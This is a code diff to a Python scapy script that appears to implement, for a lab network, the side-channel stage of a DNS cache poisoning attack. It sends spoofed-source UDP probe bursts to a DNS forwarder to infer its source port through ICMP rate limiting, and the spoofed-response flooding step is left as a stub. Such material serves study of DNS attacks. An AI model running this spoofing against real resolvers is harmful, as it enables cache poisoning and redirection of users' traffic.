@@ -3,7 +3,11 @@ import socket
 from scapy.all import *
 import random
 import time
+import threading
 from ipaddress import IPv6Network, IPv6Address
+
+
+lock = threading.Lock()
 
 
 def get_my_ip():
@@ -38,12 +42,38 @@ def random_ipv6_address():
     print(address)
     return address
 
-def step1():
+forwarder_ip = '192.168.58.2'
+forwarder_port = 53
+domain_name = "cool.com"
+local_free_ip = []
+
+def initialize():
+    # Initialize local_free_ip list
+    local_ip_base = '192.168.58.'
+    start = 5
+    end = 254
+    now = start
+    while now <= end:
+        local_free_ip.append(local_ip_base + str(now))
+        now += 1
+    #print (local_free_ip)
+    print (len(local_free_ip))
+
+def step1(thread_id):
     try:
-        # getting a random domain name to query the dns server
-        domain_name = get_random_domain()
+        
+        print("thread id: " + str(thread_id))
         print(domain_name)
-        result = dns.resolver.resolve(domain_name, 'A')
+
+        # making our dns forwarder to be used for upstream dns server
+        my_resolver = dns.resolver.Resolver()
+        my_resolver.nameservers = [forwarder_ip]
+
+        lock.acquire();
+        print("lock acquired from thread : " + str(thread_id))
+
+        result = my_resolver.resolve(domain_name, 'A')
+        print("found actual response from thread : " + str(thread_id))
     
         # this is a dns.resolver.Answer object without the __dict__ command
         print(result.__dict__)
@@ -60,20 +90,68 @@ def step1():
     except dns.resolver.NXDOMAIN:
         print ("The query name does not exist.")
 
-def step2():
-    #need to run this file with sudo because of port 53
+    lock.release()
+    print("released lock from thread : " + str(thread_id))
+
+    return
+
+# We are going to use this for infering the actual source port also,
+# that's why adding another parameter 'number_of_padding_packet'
+def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):
+
+    print("do_one_attack_chunk " + str(port_start) + "," + str(number_of_probe_packet) +
+            "," + str(number_of_padding_packet))
+
+    #ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip)) # not specifying the src, so that scapy can fill this up
+    #ip_layer = IP(dst=forwarder_ip, src=RandIP())
+    #udp_layer = UDP(dport=forwarder_port, sport=RandShort())
+    #packet = ip_layer / udp_layer / dns_layer
+
+    # generate all probe packets, padding_packets (if any) and the verification packet first
+    # and then send those in a burst
+    probe_packet = []
+
+    for i in range(number_of_probe_packet):
+        # Using spoofed ip
+        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        udp_layer = UDP(dport=forwarder_port, sport=RandShort())
+        packet = ip_layer / udp_layer
+        probe_packet.append(packet)
+
+    padding_packet = []
+
+    for i in range(number_of_padding_packet):
+        # Using spoofed ip
+        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        udp_layer = UDP(dport=1, sport=RandShort())
+        packet = ip_layer / udp_layer
+        padding_packet.append(packet)
+
+    ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
+    udp_layer = UDP(dport=1, sport=RandShort())
+    verification_packet = ip_layer / udp_layer
+
     
-    forwarder_port = 53
-    forwarder_ip = '127.0.0.1'
+    for packet in probe_packet:
+        send(packet)
+    for packet in padding_packet:
+        send(packet)
+    print("Sending verification packet")
+    reply = sr1(verification_packet, timeout=1) # in seconds
+    print("Got reply from verificaiton packet")
+    print (reply.show())
 
-    '''
-    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sender.connect((forwarder_ip, forwarder_port)) #You can't do the next command without this
-    sender.send(bytes('IP packet', encoding='utf8'))
-    '''
-    attacker_port = 1200
-    attacker_ip = '127.0.0.150'
+    return False # for now
 
+def find_the_exact_port(start_port, number_of_ports):
+    None
+
+def flood_the_port_with_spoofed_dns_response(actual_port):
+    None
+
+def step2(thread_id, source_port_range_start, source_port_range_end):
+    #need to run this file with sudo because of port 53
+    '''
     # initially trying to send a upd probe packet to the dns server to get any reply first
     # using the actual ip of this machine, but not getting it at this moment
     ip_layer = IP(dst=forwarder_ip) # not specifying the src, so that scapy can fill this up
@@ -83,20 +161,56 @@ def step2():
     #send(packet)
     ret = sr(packet)
     print(ret)
-
-    '''
-    receiver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    receiver.bind((attacker_ip, attacker_port))
-    while True:
-        data, addr = receiver.recvfrom(65565) # depends on the size of udp packet
     '''
 
+    print("thread id : " + str(thread_id))
 
-    #ret = dns.resolver.answer()
+    # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
+    while lock.locked() == False:
+        None
+    
+    ICMP_limit_rate = 50
+    ICMP_recovering_time = '20ms'
+
+    start = source_port_range_start
+
+    while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
+        start_time_one_chunk = time.perf_counter() #for system wide time count
+        
+        print("Calling do_one_attack_chunk")
+        ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
+        print("Got reply from do_one_attack_chunk : " + str(ret))
+
+        if ret: # got an ICMP reply
+            port = find_the_exact_port(start, ICMP_limit_rate)
+            result = flood_the_port_with_spoofed_dns_response(port)
+            if result == True:
+                return True
+
+        '''
+        end_time_one_chunk = time.perf_counter()
+        time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
+        if (time_elapsed_for_one_chunk < ICMP_recovering_time)
+            time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
+        '''
+        time.sleep(0.05)
+
+        start += ICMP_limit_rate
+
+    # Either actual dns response has been reached or tried all source ports
+    return False
 
 def main():
     #step1();
-    step2();
+    #step2();
+    initialize()
+    
+    t1 = threading.Thread(target=step1, args=(1, ))
+    t1.start()
+    t2 = threading.Thread(target=step2, args=(2, 33000, 33050))
+    #t2 = threading.Thread(target=step2, args=(2, 32768, 60999))
+    t2.start()
+    
 
 if __name__ == "__main__":
     main()
